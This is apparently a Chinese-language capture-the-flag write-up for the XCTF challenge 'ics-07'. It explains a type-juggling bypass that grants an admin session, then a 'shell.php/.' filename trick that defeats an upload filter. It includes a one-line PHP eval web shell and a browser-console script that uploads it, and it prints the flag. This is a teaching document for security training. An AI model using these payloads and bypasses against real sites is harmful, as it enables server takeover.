# ics-07

[题目地址](https://adworld.xctf.org.cn/challenges/details?hash=e3928d0e-e9ed-43de-829f-699cad54f42c_2)

来看看ics系列续集。

奇怪的工控云管理系统又来了，仍然只有一个界面可以点。界面底部可以查看源代码。

```php
<!DOCTYPE html>
<html>
  <head>
    <meta charset="utf-8">
    <title>cetc7</title>
  </head>
  <body>
    <?php
    session_start();

    if (!isset($_GET[page])) {
      show_source(__FILE__);
      die();
    }

    if (isset($_GET[page]) && $_GET[page] != 'index.php') {
      include('flag.php');
    }else {
      header('Location: ?page=flag.php');
    }

    ?>

    <form action="#" method="get">
      page : <input type="text" name="page" value="">
      id : <input type="text" name="id" value="">
      <input type="submit" name="submit" value="submit">
    </form>
    <br />
    <a href="index.phps">view-source</a>

    <?php
     if ($_SESSION['admin']) {
       $con = $_POST['con'];
       $file = $_POST['file'];
       $filename = "backup/".$file;

       if(preg_match('/.+\.ph(p[3457]?|t|tml)$/i', $filename)){
          die("Bad file extension");
       }else{
            chdir('uploaded');
           $f = fopen($filename, 'w');
           fwrite($f, $con);
           fclose($f);
       }
     }
     ?>

    <?php
      if (isset($_GET[id]) && floatval($_GET[id]) !== '1' && substr($_GET[id], -1) === '9') {
        include 'config.php';
        $id = mysql_real_escape_string($_GET[id]);
        $sql="select * from cetc007.user where id='$id'";
        $result = mysql_query($sql);
        $result = mysql_fetch_object($result);
      } else {
        $result = False;
        die();
      }

      if(!$result)die("<br >something wae wrong ! <br>");
      if($result){
        echo "id: ".$result->id."</br>";
        echo "name:".$result->user."</br>";
        $_SESSION['admin'] = True;
      }
     ?>

  </body>
</html>
```

首先关注到有文件上传相关内容，但是上传的前提是session等于admin。最后一段代码有提到如何得到admin的session值——$result为True。$result为True表示需要通过最上面的if判断：if (isset(\$_GET[id]) && floatval(\$_GET[id]) !== '1' && substr($_GET[id], -1) === '9')。floatval函数获取变量的浮点值，但是遇见字母等非数值会被截断。比如122.34343The的转换结果为122.34343。知道这点后就很容易绕过if判断了，浮点值不为1且最后1位是9，1a9挺不错的，1之后会被截断，最后也是9。

可能有几个疑惑的地方，floatval("1a9")结果是1，为什么不满足条件呢？因为使用的是!==，在比较的两者之间如果值不同或者类型不同就会为True。值虽然相同了，但是类型不相同，比较的'1'是字符串而不是浮点，所以永远不会相等。那这又有问题了，既然类型无论如何都不相等，为什么一定要传1？因为下面还有mysql查询，如果查询结果为False我们也得不到admin的session值。id不是1就查不到，因此必须传1。最后的问题，这样传payload的话id不是1a9吗，为什么mysql能查出来？因为mysql也是弱类型的，查询时同样会在字母处截断，所以查询1a9相当于查询id为1。

- http://61.147.171.105:56622/index.php?page=flag.php&id=1a9
  > id: 1
<br>name:admin

成功拿到admin seesion。接下来才是重头戏，文件上传！上传出有很明显的正则过滤if(preg_match('/.+\.ph(p[3457]?|t|tml)\$/i', $filename))，用于匹配文件后缀名，不能是.php,.php3-7,.phpt和phtml。基本上把能执行的php后缀都过滤掉了。但是我们可以利用linux目录特性来上传文件。shell.php/.的最后只有.，不会被正则过滤掉，但其表示的就是shell.php。.在linux目录中表示当前目录，shell.php的当前目录那就是shell.php，那么在$f = fopen($filename, 'w');这句代码打开文件名时打开的其实是shell.php，完成写入木马。

木马的上传路径是/uploaded/backup/，上传时在文件名前拼接了backup/，写入时又使用chdir切换目录到uploaded下。注意post上传文件时不能使用bp，至少我测试是这样的，使用bp好像会因为session的问题无法上传。大佬们都用hackbar，我去网上搜了chrome控制台发post的方法。把下面的内容粘贴到chrome开发者工具console中就可以发送上传文件的post包了。

```javascript
var url = "http://61.147.171.105:56622/index.php?page=flag.php&id=1a9";
var params = "file=shell.php/.&con=<?php+@eval($_POST['shell']);?>";
var xhr = new XMLHttpRequest();
xhr.open("POST", url, true);
xhr.setRequestHeader("Content-type","application/x-www-form-urlencoded"); 
xhr.onload = function (e) {
  if (xhr.readyState === 4) {
    if (xhr.status === 200) {
      console.log(xhr.responseText);
    } else {
      console.error(xhr.statusText);
    }
  }
};
xhr.onerror = function (e) {
  console.error(xhr.statusText);
};
xhr.send(params);
```

通用代码，向别的url发送别的post数据只需要改最上方的url和param变量。发送成功后蚁剑连接木马，找到flag文件得到flag。

- ### Flag
  > cyberpeace{56a777c7c12695fe000d3bbeb0f68710}